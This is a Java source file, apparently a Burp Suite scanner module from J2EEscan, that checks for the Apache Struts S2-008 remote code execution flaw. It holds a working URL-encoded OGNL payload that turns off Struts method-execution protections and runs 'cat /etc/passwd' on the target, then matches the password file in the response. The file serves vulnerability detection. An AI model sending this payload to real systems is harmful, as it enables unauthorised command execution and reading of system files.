package burp.j2ee.issues.impl;

import burp.*;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class StrutsS2008 implements IModule {
    private static final String TITLE = "Struts S2-008 Remote Code Execution (Reflect)";
    private static final String DESCRIPTION = "J2EEscan identified Struts S2-008 Reflected RCE in the webpage"
            + "<b>References</b>:<br /><br />"
            + "http://struts.apache.org/docs/s2-008.html<br />"
            + "https://github.com/vulhub/vulhub/tree/master/struts2/s2-008<br />"
            + "https://github.com/ronoski/VulApps/tree/master/s/struts2/s2-008";

    private static final String REMEDY = "Upgrade to latest Apache Struts version";

    private static final List<Pattern> PASSWORDFILE_REGEX = Arrays.asList(
            Pattern.compile("root:.*:0:[01]:", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));

    private PrintWriter stderr;
    @Override
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        stderr = new PrintWriter(callbacks.getStderr(), true);
        List<IScanIssue> issues = new ArrayList<>();

        String payload_template = "?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/etc/passwd%27%29.getInputStream%28%29%29)";
        IExtensionHelpers helpers = callbacks.getHelpers();

        IRequestInfo reqInfo = callbacks.getHelpers().analyzeRequest(baseRequestResponse);
        URL curURL = reqInfo.getUrl();

        String protocol = curURL.getProtocol();
        String host = curURL.getHost();
        int port = curURL.getPort();
        String path = curURL.getPath();

        try{
            URL newURL = new URL(protocol, host, port,  path + payload_template);
            byte[] newMessage = helpers.buildHttpRequest(newURL);
            IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),
                    newMessage);

            //stderr.println(newURL.toString()); //debug message
            String response = helpers.bytesToString(checkRequestResponse.getResponse());
            for (Pattern xincludeMatcher : PASSWORDFILE_REGEX) {

                Matcher matcher = xincludeMatcher.matcher(response);

                if (matcher.find()) {
                    issues.add(new CustomScanIssue(
                            baseRequestResponse.getHttpService(),
                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                            checkRequestResponse,
                            TITLE,
                            DESCRIPTION,
                            REMEDY,
                            Risk.High,
                            Confidence.Firm
                    ));
                    return issues;
                }
            }

        }catch (MalformedURLException ex) {
            stderr.println("Error creating URL " + ex.getMessage());
        }

        return issues;
    }
}
